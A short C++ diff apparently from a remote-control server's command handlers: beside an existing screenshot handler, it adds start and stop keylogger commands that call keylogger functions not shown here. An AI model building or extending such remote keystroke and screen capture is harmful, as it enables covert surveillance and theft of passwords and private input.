@@ -71,6 +71,17 @@ json ProcessHandlers::captureScreen(const json&) {
     return {{"type","screenshot"},{"success",true},{"data",b64}};
 }
 
+// === KEYLOGGER HANDLERS ===
+json ProcessHandlers::startKeylog(const json&) {
+    startKeylogger();
+    return { {"type","status"}, {"success", true}, {"message", "Keylogger started"} };
+}
+
+json ProcessHandlers::stopKeylog(const json&) {
+    stopKeylogger();
+    return { {"type","status"}, {"success", true}, {"message", "Keylogger stopped"} };
+}
+
 // Trả về danh sách tất cả command mà server hỗ trợ.
 json ProcessHandlers::help(const json&) {
     return {
